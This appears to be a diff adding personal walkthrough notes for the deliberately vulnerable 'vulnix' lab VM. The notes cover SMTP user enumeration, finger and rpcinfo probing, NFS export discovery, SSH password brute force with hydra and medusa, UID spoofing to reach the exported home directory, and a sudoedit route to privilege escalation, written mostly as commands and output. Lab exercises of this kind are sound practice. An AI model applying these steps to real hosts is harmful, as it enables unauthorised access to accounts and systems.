@@ -1,0 +1,128 @@
+# guess user in the SMTP server
+nc -v 10.0.0.128 25
+220 vulnix ESMTP Postfix (Ubuntu)
+ehlo server
+250-vulnix
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+vrfy vulnix
+252 2.0.0 vulnix
+# vulnix is a user
+
+
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.0.0.128
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+Target count ............. 1
+Username count ........... 8295455
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Wed Apr  1 10:46:34 2020 #########
+10.0.0.128: mail exists
+10.0.0.128: root exists
+10.0.0.128: news exists
+10.0.0.128: man exists
+10.0.0.128: bin exists
+10.0.0.128: games exists
+10.0.0.128: nobody exists
+10.0.0.128: backup exists
+10.0.0.128: daemon exists
+10.0.0.128: proxy exists
+10.0.0.128: list exists
+10.0.0.128: Man exists
+10.0.0.128: Daemon exists
+10.0.0.128: postmaster exists
+10.0.0.128: user exists
+10.0.0.128: sys exists
+10.0.0.128: Proxy exists
+10.0.0.128: Nobody exists
+10.0.0.128: landscape exists
+
+#
+# using finger for each discovered user
+finger root@10.0.0.128
+....
+finger mail@10.0.0.128
+Login: mail                             Name: mail
+Directory: /var/mail                    Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovecot                          Name: Dovecot mail server (this is an email server!) 
+Directory: /usr/lib/dovecot             Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+
+#
+# rpcinfo
+rpcinfo -p 10.0.0.128
+....
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+....
+# this show that nfs is mounted in a port
+
+#
+# show nfs mounts
+showmount -e 10.0.0.128
+Export list for 10.0.0.128:
+/home/vulnix *
+
+#
+# and mount what we found
+mount 10.0.0.128:/home/vulnix /mnt/vulnix/
+ls /mnt/vulnix/
+ls: cannot open directory '/mnt/vulnix/': Permission denied
+# nothing to see here :( it uses root_squash
+
+
+hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt ssh://10.0.0.128 -I -t 4
+[22][ssh] host: 10.0.0.128   login: user   password: letmein
+
+medusa -h 10.0.0.128 -U users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt -e ns -f -M ssh
+ACCOUNT FOUND: [ssh] Host: 10.0.0.128 User: user Password: letmein [SUCCESS]
+
+
+# priv escalation
+Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012
+
+127.0.0.1:884
+
+# here in kali we add a user vulnix to access /mnt/vulnix
+useradd -u 2008 vulnix
+mkdir /home/vulnix
+chown vulnix -R /home/vulnix
+su - vulnix
+# vulnix user
+$ cd /mnt/vulnix
+
+# here in kali
+ssh-keygen # gen key here
+chmod 400 id_rsa
+ssh -i id_rsa vulnix@10.0.0.128
+
+sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+
+https://www.thegeekdiary.com/understanding-the-etc-exports-file/
+# we have to restart the VM
+https://mrh4sh.github.io/vulnix-solution
